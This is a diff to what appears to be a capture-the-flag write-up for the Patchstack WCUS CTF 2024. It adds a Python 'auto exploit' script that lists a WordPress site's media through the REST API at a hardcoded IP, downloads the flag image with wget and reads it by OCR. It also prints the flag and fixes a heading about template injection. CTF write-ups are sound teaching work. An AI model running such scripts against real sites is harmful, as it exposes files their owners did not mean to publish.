@@ -212,6 +212,41 @@ To obtain the FLAG, since our analysis revealed that the Makefile performs a med
 Simply access the endpoint for the FLAG image with the filename "flag_secret_not_so_random_get_me_1337.png", and the FLAG will be obtained.
 ![Flag](/assets/img/Patchstack-WCUS-CTF-2024/SecretInfo_Flag.png)
 
+Auto Exploit Script with Image to Text:
+
+```python
+import requests
+import json
+import os
+import pytesseract
+from PIL import Image
+from urllib.parse import *
+
+URL = 'http://100.25.255.51:9091/'
+
+class Exploit:
+	def __init__(self, url=URL):
+		self.url = url
+
+	def exploit(self):
+		req = requests.get(urljoin(self.url, '/wp-json/wp/v2/media/'))
+		imageUrl = json.loads(req.text)[0]['guid']['rendered']
+		flagName = imageUrl.split('/')[-1]
+		downloadImage = os.system(f'wget {imageUrl}')
+		if flagName in os.listdir():
+			print('[+] Flag Image Downloaded')
+
+		# Image to Text
+		image = Image.open(flagName)
+		text = pytesseract.image_to_string(image).replace(' ', '_')
+
+		return text
+
+if __name__ == '__main__':
+	run = Exploit()
+	print(run.exploit())
+```
+
 **Flag:** CTF{67fd32eea87891bc_it_is_a_feature_by_core_xd}
 
 **Remediation:**
@@ -1053,7 +1088,7 @@ Timber::render($page, $context);
 
 ```
 
-**Vulnerable Code: Server Side Template Injection (STTI)**\
+**Vulnerable Code: Server-Side Template Injection (STTI)**\
 In the index.php file, there’s a part vulnerable to SSTI: when a user makes a request with the parameter "page", Twig renders the template provided by the user through the "page" parameter. However, if the "page" parameter is not set, Twig will render the template-home.twig file by default.
 
 ```php
